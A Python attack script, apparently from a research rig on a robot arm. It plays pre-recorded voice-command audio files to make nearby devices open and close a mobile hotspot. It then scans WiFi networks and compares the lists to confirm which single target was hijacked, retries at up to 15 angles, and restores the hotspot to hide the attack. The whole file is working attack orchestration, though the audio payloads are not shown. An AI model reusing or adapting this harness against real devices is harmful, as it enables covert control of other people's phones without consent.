#!/usr/bin/python3
# coding=utf8
import sys
sys.path.append('/home/ubuntu/ArmPi/HiwonderSDK/PWMServo')
import time
import threading
import time
import subprocess



#List status detected by hotspot switch after simulating attack signal attack
#Identify feedback
def feedbackMechanism():
    #Retrieve AttackCMD attack list L1 and FeedbackCMD1 attack list L2
    L1,L2=Step1()
    result = Step2(L1,L2)
    return result

#-------------------------------------------------------------------------
#Implement the first step of the attack
def Step1():
    List1 = Receive_Wlan()
    for index in range(len(List1)):
        print(List1[index])
    time.sleep(4)
    subprocess.run(['aplay','-D','hw:1,3','MuteCmd.wav'], check=True)
    time.sleep(6)
    # First, send the attack command
    print("Send attack command")
    subprocess.run(['aplay','-D','hw:1,3','AttackCmd.wav'], check=True)
    print("The first step of feedback testing is to obtain the hot signal L1 after the attack")
    #Save the list of accepted computer signals as L1
    time.sleep(13)
    
    # for index in range(len(L1)):
    #     if index % 5 == 0:
    #         print(L1[index])
    #   Open the target hotspot!!! Send FeedbackCMD1
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("Send the hotspot open command to obtain the current hotspot list:")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    # FeedbackCmd1

    subprocess.run(['sudo','aplay','-D','hw:1,3','FeedbackCmd1.wav'], check=True)
    # time.sleep(1)
    print("=============================================================")
    print("Send hotspot open signal FeedbackCMD1")
    print("=============================================================")
    print("Start Send FeedbackCmd1...")
    # Give a time to send FeedbackCMD1
    time.sleep(12)  # Pause for 5 seconds to allow the hacker sufficient time to send the command to open the hotspot signal
    print("=============================================================")
    print("Send Achieve.")
    print("=============================================================")

    #Save the list of received computer signals as L2
    List2 = Receive_Wlan2()
    print("The content of the L2 list of hot signals returned by the feedback test is")
    for index in range(len(List2)):
        print(List2[index])
    
    return List1,List2



#-------------------------------------------------------------------------
#Implement the second step of the attack
def Step2(L1,L2):
    # Send FeedbackCMD2
    print("Feedback test step two, turn off hotspot signal")
    # Send FeedbackCMD2 in five seconds, turn off mobile hotspot
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("Send the attack target hotspot shutdown command:")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    # FeedbackCmd1
    subprocess.run(['sudo','aplay','-D','hw:1,3','FeedbackCmd2.wav'], check=True)
    # time.sleep(1)
    print("=============================================================")
    print("Send hotspot shutdown signal FeedbackCMD2")
    # Send FeedbackCMD2 in five seconds
    print("=============================================================")
    print("Start Send FeedbackCmd2...")
    time.sleep(7)  # Pause for 5 seconds and give the hacker a time to turn off the hotspot signal
    print("=============================================================")
    print("Send Achieve.")
    print("=============================================================")
    # Save the list of received computer signals as L3
    L3 = Receive_Wlan2()
    print("The content of the L3 list returned by turning off the hotspot signal is")
    for index in range(len(L3)):
        print(L3[index])

    print("To prove the effectiveness of the attack, perform a difference set on the results of two lists")
    diff1=list(set(L3).symmetric_difference(set(L2)))
    length = len(diff1)

    print("=============================================================")
    print("The difference set between L2 and L3 is:")
    for item in diff1:
        print(item)
    print("=============================================================")
    
    if length != 0:
        print("The difference set is not empty, and the results returned by the two lists are different, but the interference of weak signals cannot be ruled out, so a deeper test should be conducted")
        return Step3(L1,L3,diff1)
    else:
        
        print("If the difference set is empty, it proves that there is no difference between the two results before and after the hotspot opening and closing signal is sent, without loss of generality, which can fully prove that the attack signal of hotspot opening and closing did not work")
        return False


#-------------------------------------------------------------------------
def Step3(L1,L3,diff1):
    print("To eliminate interference from sudden opening and closing signals, execute the third step of the attack and reopen the hotspot signal")
    time.sleep(3)
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("Send the attack target hotspot open command:")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    print("-----------------------------------------------------------------------------------------------")
    # FeedbackCmd1
    subprocess.run(['sudo','aplay','-D','hw:1,3','FeedbackCmd1.wav'], check=True)
    # time.sleep(1)
    print("=============================================================")
    print("Send hotspot open signal FeedbackCMD1")
    print("=============================================================")
    print("Start Send FeedbackCmd1...")
    time.sleep(2)  
    print("=============================================================")
    print("Send Achieve.")
    print("=============================================================")
    L4=Receive_Wlan2()
    print("The content of the L4 list opened by the hotspot returned in Step 3 is")
    for index in range(len(L4)):
        print(L4[index])
    
    print("Take the difference set between L3 and L4 and see the difference between two closed and open operations")
    diff2 = list(set(L4).symmetric_difference(set(L3)))
    print("=============================================================")
    print("The difference set between L3 and L4 is:")
    for item in diff2:
        print(item)
    print("=============================================================")
    Target = list(set(diff1).intersection(set(diff2)))

    print("=============================================================")
    print("The difference set between diff1 and diff2 is:")
    for item in Target:
        print(item)
    print("=============================================================")
    
    length2 = len(Target)
    if length2 == 1:
        print("Only one target was affected, and the attack was successful")
        Step4(Target,L4,L1)
        return True
    else:
        print("If there are more than one or zero affected targets, the attack will fail")
        return False
def Step4(Target,L4,L1):
    print("To ensure seamless attacks and restore the previous hotspot state")
    subprocess.run(['sudo','aplay','-D','hw:1,3','FeedbackCmd2.wav'], check=True)
    # list = list(set(L4).difference(set(L1)))
    # if list == Target:
    #     subprocess.run(['sudo','aplay','-D','hw:1,3','FeedbackCmd2.wav'], check=True)
    #     print("Successfully restored the hotspot state of the target before the attack!")
def Receive_Wlan(min_quality=50):
    try:
        result = subprocess.run(['sudo', 'iwlist', 'wlp0s20f3', 'scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=True)

        print("Raw output from iwlist command:")
        ssid_list = []
        current_quality = None
        
        for line in result.stdout.split('\n'):
            line = line.strip()
            
            if "Quality" in line:
                quality_part = line.split('=')[1].split('/')[0]
                current_quality = int(quality_part)
            
            if "ESSID" in line:
                ssid = line.split(':')[1].strip('"')
                # Exclude the fixed WiFi that is always present in the scenario.
                if ssid and ssid != "X" and ssid != "XX" and ssid != "XXX" and current_quality is not None and current_quality >= min_quality:
                    ssid_list.append(ssid)
                current_quality = None  

        
        ssid_list = list(set(ssid_list))  
        return ssid_list
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e.stderr}")
        return []


def Receive_Wlan2(min_quality=50):
    try:

        subprocess.run(['sudo', 'ifconfig', 'wlp0s20f3', 'down'], check=True)
        time.sleep(4)
        subprocess.run(['sudo', 'ifconfig', 'wlp0s20f3', 'up'], check=True)
        time.sleep(4) 
        result = subprocess.run(['sudo', 'iwlist', 'wlp0s20f3', 'scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=True)

        ssid_list = []
        current_quality = None
        
        for line in result.stdout.split('\n'):
            line = line.strip()
            
            if "Quality" in line:
                quality_part = line.split('=')[1].split('/')[0]
                current_quality = int(quality_part)
            
            if "ESSID" in line:
                ssid = line.split(':')[1].strip('"')
                # Exclude the fixed WiFi that is always present in the scenario.
                if ssid and ssid != "X" and ssid != "XX" and ssid != "XXX" and current_quality is not None and current_quality >= min_quality:
                    ssid_list.append(ssid)
                current_quality = None  
        
        ssid_list = list(set(ssid_list))  
        return ssid_list
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e.stderr}")
        return []
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return []

    
if sys.version_info.major == 2:
    print('Please run this program with python3!')
    sys.exit(0)
    
    
if __name__ == '__main__':
    for i in range(15): 
        # angle  = 880 + i * 95
        print('The' + str(i+1) +'attempt')
        AttackRes = feedbackMechanism()
        if(AttackRes == True):
            print("This attack is successful, and the angle has completed the attack!!!")
            break
        else:
            print("This attack failed, try rotating the angle again!!!")
        print('Target hunting......')
        time.sleep(1)
    
